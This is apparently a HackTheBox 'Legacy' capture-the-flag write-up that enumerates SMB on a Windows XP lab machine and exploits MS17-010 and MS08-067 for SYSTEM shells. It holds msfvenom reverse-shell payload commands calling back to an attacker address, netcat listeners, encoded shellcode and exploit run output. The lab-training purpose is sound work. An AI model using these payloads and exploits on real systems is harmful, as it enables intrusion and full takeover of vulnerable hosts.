# Hackthebox Legacy

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -sV -oX nmap_full_legacy.xml -p- 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:17 EDT
Nmap scan report for 10.10.10.4
Host is up (0.035s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.45 seconds
```

The services we are looking at are Samba and RDP (Remote Desktop Protocol).

Enumerate the service versions does not bring much details
```
$ nmap -Pn -A -T4 -p 139,445,3389 10.10.10.4 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:31 EDT
Nmap scan report for 10.10.10.4
Host is up (0.035s latency).

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m44s, deviation: 2h07m16s, median: 4d22h57m44s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:63:d1 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-10-12T21:29:32+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.47 seconds

```

Samba does not give us much more using commands
```
$ sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.10.4
$ nmap -Pn --script smb-enum-shares.nse -p445 10.10.10.4
$ smbclient -N -L ////10.10.10.4
$ smbclient -U "" \\\\10.10.10.4\\

```
But we get more information with enum4linux and nbmlookup
```
$ nmblookup -A 10.10.10.4      
Looking up status of 10.10.10.4
	LEGACY          <00> -         B <ACTIVE> 
	HTB             <00> - <GROUP> B <ACTIVE> 
	LEGACY          <20> -         B <ACTIVE> 
	HTB             <1e> - <GROUP> B <ACTIVE> 
	HTB             <1d> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 

$ enum4linux -U 10.10.10.4 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct  7 13:02:55 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB

 =================================== 
|    Session Check on 10.10.10.4    |
 =================================== 
[+] Server 10.10.10.4 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.10.4    |
 ========================================= 
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =========================== 
|    Users on 10.10.10.4    |
 =========================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
```

## Vulnerability analysis

As we have an Windows XP machine there is a good chance we find some Samba vulnerabilities.
```
$ nmap -Pn --script smb-vuln* -p 445 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:46 EDT
Nmap scan report for 10.10.10.4
Host is up (0.040s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```
Indeed, MS08-067 and MS17-010 (Eternal Blue) are found.

## System hacking

### Samba

#### MS17-010 (Eternal Blue)

Credit to https://github.com/helviojunior/MS17-010 (python2)

Install Python 2.7.18 using pyenv
pyenv installer: https://github.com/pyenv/pyenv-installer

Kali instructions to use EOL python versions: https://www.kali.org/docs/general-use/using-eol-python-versions/

pyenv tutorial for the basic commands: https://amaral.northwestern.edu/resources/guides/pyenv-tutorial

Once the python virtual environment is created and the virtual python binary is found from the PATH

Create the payload

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.18_443.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev_10.10.14.18_443.exe
```
Start the listener
```
$ nc -nvlp 443            
listening on [any] 443 ...
```

Execute the script
```
$ python send_and_execute.py 10.10.10.4 rev_10.10.14.18_443.exe 
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81b036c0
SESSION: 0xe10506a8
FLINK: 0x5bd48
InData: 0x5ae28
MID: 0xa
TRANS1: 0x58b50
TRANS2: 0x5ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe21b06a8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe21b0748
overwriting token UserAndGroups
Sending file 1RIA57.exe...
Opening SVCManager on 10.10.10.4.....
Creating service xqJm.....
Starting service xqJm.....

```
And we have a shell
```
$ nc -nvlp 443            
listening on [any] 443 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.4] 1045
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>systeminfo
systeminfo

Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
...
```
Since whoami did not work, we shall get it from our Kali box. Set up a share that we can access from the target machine.
```
$ locate whoami.exe                            
/usr/share/windows-resources/binaries/whoami.exe
$ smbserver.py sharedir /usr/share/windows-binaries 
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
And now access the file from the target machine
```
C:\WINDOWS\system32>\\10.10.14.18\sharedir\whoami.exe
\\10.10.14.18\a\whoami.exe
NT AUTHORITY\SYSTEM

C:\WINDOWS\system32>
```
And the flag is in the usual place
```
C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.400.626.688 bytes free
```

#### MS08-067

Credit to https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067 (python2)

Generate payload:
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xae\x91\xdb\xef\x83\xee\xfc\xe2\xf4\x52\x79\x59\xef\xae\x91"
"\xbb\x66\x4b\xa0\x1b\x8b\x25\xc1\xeb\x64\xfc\x9d\x50\xbd\xba"
"\x1a\xa9\xc7\xa1\x26\x91\xc9\x9f\x6e\x77\xd3\xcf\xed\xd9\xc3"
"\x8e\x50\x14\xe2\xaf\x56\x39\x1d\xfc\xc6\x50\xbd\xbe\x1a\x91"
"\xd3\x25\xdd\xca\x97\x4d\xd9\xda\x3e\xff\x1a\x82\xcf\xaf\x42"
"\x50\xa6\xb6\x72\xe1\xa6\x25\xa5\x50\xee\x78\xa0\x24\x43\x6f"
"\x5e\xd6\xee\x69\xa9\x3b\x9a\x58\x92\xa6\x17\x95\xec\xff\x9a"
"\x4a\xc9\x50\xb7\x8a\x90\x08\x89\x25\x9d\x90\x64\xf6\x8d\xda"
"\x3c\x25\x95\x50\xee\x7e\x18\x9f\xcb\x8a\xca\x80\x8e\xf7\xcb"
"\x8a\x10\x4e\xce\x84\xb5\x25\x83\x30\x62\xf3\xf9\xe8\xdd\xae"
"\x91\xb3\x98\xdd\xa3\x84\xbb\xc6\xdd\xac\xc9\xa9\x6e\x0e\x57"
"\x3e\x90\xdb\xef\x87\x55\x8f\xbf\xc6\xb8\x5b\x84\xae\x6e\x0e"
"\xbf\xfe\xc1\x8b\xaf\xfe\xd1\x8b\x87\x44\x9e\x04\x0f\x51\x44"
"\x4c\x85\xab\xf9\xd1\xe5\xa0\x84\xb3\xed\xae\x90\x60\x66\x48"
"\xfb\xcb\xb9\xf9\xf9\x42\x4a\xda\xf0\x24\x3a\x2b\x51\xaf\xe3"
"\x51\xdf\xd3\x9a\x42\xf9\x2b\x5a\x0c\xc7\x24\x3a\xc6\xf2\xb6"
"\x8b\xae\x18\x38\xb8\xf9\xc6\xea\x19\xc4\x83\x82\xb9\x4c\x6c"
"\xbd\x28\xea\xb5\xe7\xee\xaf\x1c\x9f\xcb\xbe\x57\xdb\xab\xfa"
"\xc1\x8d\xb9\xf8\xd7\x8d\xa1\xf8\xc7\x88\xb9\xc6\xe8\x17\xd0"
"\x28\x6e\x0e\x66\x4e\xdf\x8d\xa9\x51\xa1\xb3\xe7\x29\x8c\xbb"
"\x10\x7b\x2a\x3b\xf2\x84\x9b\xb3\x49\x3b\x2c\x46\x10\x7b\xad"
"\xdd\x93\xa4\x11\x20\x0f\xdb\x94\x60\xa8\xbd\xe3\xb4\x85\xae"
"\xc2\x24\x3a";
```

Insert the payload to the script and execute.

```
$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python ms08_067_script.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

And get your prompt through a listener

```
$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>more "C:\Documents and Settings\Administrator\Desktop\root.txt"
more "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d...
```



